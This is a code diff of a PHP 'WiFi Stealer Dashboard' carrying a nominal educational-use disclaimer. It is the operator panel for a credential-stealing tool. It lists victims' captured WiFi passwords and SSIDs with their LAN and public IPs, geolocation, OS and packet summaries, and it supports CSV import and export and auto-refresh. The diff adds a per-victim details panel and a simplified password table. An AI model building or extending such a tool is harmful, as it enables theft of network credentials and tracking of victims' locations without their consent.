@@ -1,5 +1,5 @@
 <?php
-// WiFi Stealer Dashboard (extended + CSV upload button)
+// WiFi Stealer Dashboard (full updated version)
 // DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.
 
 date_default_timezone_set('Asia/Kolkata');
@@ -44,6 +44,7 @@ function parse_capture_line($line)
     $longitude     = trim($fields[8] ?? '');
     $pktSummary    = trim($fields[9] ?? '');
 
+    // Filter out header/garbage rows
     $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
     if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
         return null;
@@ -161,7 +162,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     exit;
 }
 
-// --- 2. CSV IMPORT: via upload button ---
+// --- 2. CSV IMPORT: via upload button (frontend) ---
 $importStatus = null;
 if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
     if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
@@ -266,8 +267,22 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-// --- 7. View mode ---
-$viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'full';
+// --- 7. Build JS data for details view ---
+$jsDetails = [];
+foreach ($captureEntries as $entry) {
+    $jsDetails[] = [
+        'ip_main'      => $entry['ip_main'],
+        'lan_ip_extra' => $entry['lan_ip_extra'],
+        'public_ip'    => $entry['public_ip'],
+        'latitude'     => $entry['latitude'],
+        'longitude'    => $entry['longitude'],
+        'pkt_summary'  => $entry['pkt_summary'],
+        'os'           => $entry['os'],
+    ];
+}
+
+// --- 8. View mode (kept for future use, but table now uses basic columns always) ---
+$viewMode = 'basic';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -462,6 +477,7 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
         var autoRefresh = false;
         var refreshTimer = null;
         var REFRESH_INTERVAL = 10000;
+        window.captureDetails = <?php echo json_encode($jsDetails); ?>;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -490,6 +506,34 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
                 toggleAutoRefresh(false);
             }
         });
+
+        function showDetails(idx) {
+            idx = parseInt(idx, 10);
+            var row = window.captureDetails[idx];
+            if (!row) return;
+
+            var box = document.getElementById('details-box');
+            var content = document.getElementById('details-content');
+            var title = document.getElementById('details-title');
+
+            title.textContent = 'Details of capture #' + (idx + 1);
+
+            var html = '';
+            html += '<div><strong>Victim LAN IP:</strong> ' + row.ip_main + '</div>';
+            html += '<div><strong>LAN extra:</strong> ' + row.lan_ip_extra + '</div>';
+            html += '<div><strong>Public IP:</strong> ' + row.public_ip + '</div>';
+            html += '<div><strong>Location:</strong> ' + row.latitude + ', ' + row.longitude + '</div>';
+            html += '<div><strong>Packet summary:</strong> ' + row.pkt_summary + '</div>';
+            html += '<div><strong>OS:</strong> ' + row.os + '</div>';
+
+            content.innerHTML = html;
+            box.style.display = 'block';
+        }
+
+        function hideDetails() {
+            var box = document.getElementById('details-box');
+            box.style.display = 'none';
+        }
     </script>
 </head>
 <body>
@@ -514,14 +558,6 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
                 <button type="submit" class="btn btn-sm">Upload CSV</button>
             </form>
 
-            <a href="?view=full" class="btn btn-sm"
-               style="<?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
-                Full view
-            </a>
-            <a href="?view=compact" class="btn btn-sm"
-               style="<?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
-                Compact view
-            </a>
             <button type="button" class="btn" id="auto-refresh-toggle"
                     onclick="toggleAutoRefresh(!autoRefresh);">
                 Auto-refresh: OFF
@@ -566,6 +602,7 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
         </div>
     </div>
 
+    <!-- BASIC TABLE VIEW -->
     <div class="card">
         <table>
             <thead>
@@ -573,27 +610,16 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
                 <th>#</th>
                 <th>Time</th>
                 <th>SSID</th>
-                <?php if ($viewMode === 'full'): ?>
-                    <th>Password</th>
-                    <th>Len</th>
-                    <th>Strength</th>
-                    <th>Victim LAN IP</th>
-                    <th>LAN extra</th>
-                    <th>Public IP</th>
-                    <th>Location</th>
-                    <th>Packet summary</th>
-                    <th>OS</th>
-                <?php else: ?>
-                    <th>Pass / strength</th>
-                <?php endif; ?>
+                <th>Password</th>
+                <th>Len</th>
+                <th>Strength</th>
                 <th>Actions</th>
             </tr>
             </thead>
             <tbody>
             <?php if (empty($captureEntries)): ?>
                 <tr>
-                    <td colspan="<?php echo $viewMode === 'full' ? 13 : 5; ?>"
-                        style="text-align:center; padding:12px; color:#9ca3af;">
+                    <td colspan="7" style="text-align:center; padding:12px; color:#9ca3af;">
                         No captures yet.
                     </td>
                 </tr>
@@ -603,42 +629,28 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
                         <td><?php echo h($entry['idx'] + 1); ?></td>
                         <td><?php echo h($entry['time']); ?></td>
                         <td><?php echo h($entry['ssid']); ?></td>
-
-                        <?php if ($viewMode === 'full'): ?>
-                            <td class="password"><?php echo h($entry['password']); ?></td>
-                            <td><?php echo h($entry['len']); ?></td>
-                            <td>
-                                <?php if ($entry['weak']): ?>
-                                    <span class="badge badge-weak">weak</span>
-                                <?php else: ?>
-                                    <span class="badge badge-ok">ok</span>
-                                <?php endif; ?>
-                            </td>
-                            <td><?php echo h($entry['ip_main']); ?></td>
-                            <td><?php echo h($entry['lan_ip_extra']); ?></td>
-                            <td><?php echo h($entry['public_ip']); ?></td>
-                            <td><?php echo h($entry['latitude'] . ', ' . $entry['longitude']); ?></td>
-                            <td><?php echo h($entry['pkt_summary']); ?></td>
-                            <td><?php echo h($entry['os']); ?></td>
-                        <?php else: ?>
-                            <td>
-                                <span class="password"><?php echo h($entry['password']); ?></span><br>
-                                <?php if ($entry['weak']): ?>
-                                    <span class="badge badge-weak">weak</span>
-                                <?php else: ?>
-                                    <span class="badge badge-ok">ok</span>
-                                <?php endif; ?>
-                            </td>
-                        <?php endif; ?>
-
+                        <td class="password"><?php echo h($entry['password']); ?></td>
+                        <td><?php echo h($entry['len']); ?></td>
                         <td>
-                            <form method="post" style="display:inline;"
+                            <?php if ($entry['weak']): ?>
+                                <span class="badge badge-weak">weak</span>
+                            <?php else: ?>
+                                <span class="badge badge-ok">ok</span>
+                            <?php endif; ?>
+                        </td>
+                        <td>
+                            <button type="button"
+                                    class="btn btn-sm"
+                                    onclick="showDetails('<?php echo h($entry['idx']); ?>');">
+                                Details
+                            </button>
+
+                            <form method="post"
+                                  style="display:inline;"
                                   onsubmit="return confirm('Delete this entry?');">
                                 <input type="hidden" name="action" value="delete_one">
                                 <input type="hidden" name="idx" value="<?php echo h($entry['log_index']); ?>">
-                                <button type="submit" class="btn btn-sm btn-danger">
-                                    Delete
-                                </button>
+                                <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                             </form>
                         </td>
                     </tr>
@@ -646,6 +658,15 @@ $viewMode = isset($_GET['view']) && $_GET['view'] === 'compact' ? 'compact' : 'f
             <?php endif; ?>
             </tbody>
         </table>
+    </div>
+
+    <!-- DETAILS PANEL -->
+    <div id="details-box" class="card" style="margin-top:12px; display:none;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+            <div id="details-title" style="font-weight:600; font-size:14px;">Details of capture</div>
+            <button type="button" class="btn btn-sm btn-danger" onclick="hideDetails();">Close</button>
+        </div>
+        <div id="details-content" style="font-size:12px; line-height:1.6;"></div>
     </div>
 
     <div class="footer">
